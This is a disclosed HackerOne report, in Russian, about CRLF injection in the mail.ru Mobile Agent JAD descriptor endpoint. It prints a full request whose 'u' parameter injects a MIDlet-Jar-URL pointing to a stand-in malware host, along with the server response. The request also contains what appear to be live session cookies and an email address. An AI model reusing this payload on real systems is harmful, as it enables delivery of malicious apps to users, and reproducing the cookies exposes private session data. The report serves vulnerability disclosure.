---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '20391'
original_report_id: '20391'
title: 'm.agent.mail.ru: Подделываем j2me app-descriptor'
team_handle: mailru
created_at: '2014-07-17T16:05:25.381Z'
disclosed_at: '2015-09-13T12:08:11.984Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
---

# m.agent.mail.ru: Подделываем j2me app-descriptor

## Metadata

- HackerOne Report ID: 20391
- Weakness: 
- Program: mailru
- Disclosed At: 2015-09-13T12:08:11.984Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Можно подправить :) Ну и соответственно, юзеру выдать черте-что вместо побильного аппа :)
Принцип XSS через параметр "u".

GET /cgi-bin/MobileAgent.jad?part=tree37&stat=&u=test%0d%0aMIDlet-Jar-URL:%20http://malware.site.com/Malware.jar&p=0&f=0&g=0&b=0&c=0&s=0&x=0&r=13518402519 HTTP/1.1
Host: m.agent.mail.ru
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://m.agent.mail.ru/cgi-bin/getagent_static35?vers=java&part=tree37&u=
Cookie: mrcu=C3EB52FA632E5958028A5821010A; p=8BkAAFHOkAAA; VID=3grP2o1i30nF:; searchuid=9987040291391447473; _ga=GA1.2.145097379.1400943163; s_cp=dpr=2; c=N1TFUwAAABotDgATAQAA9gAAAQAA; optimizelySegments=%7B%221363374953%22%3A%22direct%22%2C%221379862954%22%3A%22ff%22%2C%221356673191%22%3A%22false%22%7D; optimizelyEndUserId=oeu1404747734356r0.5230243679244354; optimizelyBuckets=%7B%7D; mc2=parapa.mail.ru; statistics=sub%3Aplay%3Aauditory%3Aauditory_v1%3Atargeting; __utmb=41676084.1.10.1405607049; _ym_visorc_9569476=w; lang=ru; lang_set=1; swa_lang=ru; s=fver=14|geo=2582|georb=70|geol1=188; sdcs=LOE3Wp1PzhC2DY6b; HTML5Uploader=2; gmt=4; ssdc_info=b28b:0:1405443710; ssdc=b28bc8b89eed47a991ab7df94c2f2428; sdc=zv79rktfbXoyAZOJ; Mpop=1405610402:79077d5246435c5619050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAID3gcA; i=AQCj6cdTBwATAAgiC3QAASMBAWQBAY8BARkCAe4CAbkDAdwEAvQEAQAGARonAV0ABQIB/agACAcCBQABvgABqgAIBwIFAAG+AAHJAAUCAf7vAQgEAQEAAVgDCAQBAQAB; agent_family=62; __utmc=243978240; mc1=1405611591; __utma=202220033.145097379.1400943163.1403183335.1404741046.4; __utmz=202220033.1400945162.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)





HTTP/1.1 200 OK
Server: nginx
Date: Thu, 17 Jul 2014 16:03:03 GMT
Content-Type: text/vnd.sun.j2me.app-descriptor
Connection: close
Cache-Control: no-cache,must-revalidate
Expires: now
Pragma: no-cache
Content-Disposition: attachment; filename="MobileAgent.jad"
Content-Length: 1192

MIDlet-1: MobileAgent,/icon.png,main.Midlet
MIDlet-Description: Mobile Mail Agent
MIDlet-Icon: /icon.png
MIDlet-Info-URL: http://www.mail.ru/
MIDlet-Jar-Size: 299363
MIDlet-Jar-URL: http://bin.wap.mail.ru/tree37/p0_f0_g0_b0_c0_s0_x0/MobileAgent.jar
MIDlet-Name: MobileAgent
MIDlet-Vendor: @mail.ru
MIDlet-Version: 4.3.05
MicroEdition-Configuration: CLDC-1.0
MicroEdition-Profile: MIDP-2.0
Background: True
FlipInsensitive: True
Nokia-MIDlet-No-Exit: true
MIDlet-Permissions-Opt: javax.microedition.io.Connector.socket,javax.microedition.io.Connector.http,javax.microedition.io.Connector.https,javax.microedition.io.Connector.file.read,javax.microedition.io.Connector.file.write,javax.microedition.pim.ContactList.read,javax.microedition.pim.ContactList.write,javax.microedition.media.control.VideoControl.getSnapshot,javax.microedition.io.Connector.sms,javax.wireless.messaging.sms.send,javax.microedition.io.Connector.datagram
Agent-Modules: Default
X-MRA-DownloadDate: 1405612983
X-MRA-UserAgent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
X-MRA-GUID: e39c5d7d07dd9b4cf1e2b0151ffbcd3d
X-MRA-Invite: test
MIDlet-Jar-URL: http://malware.site.com/Malware.jar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
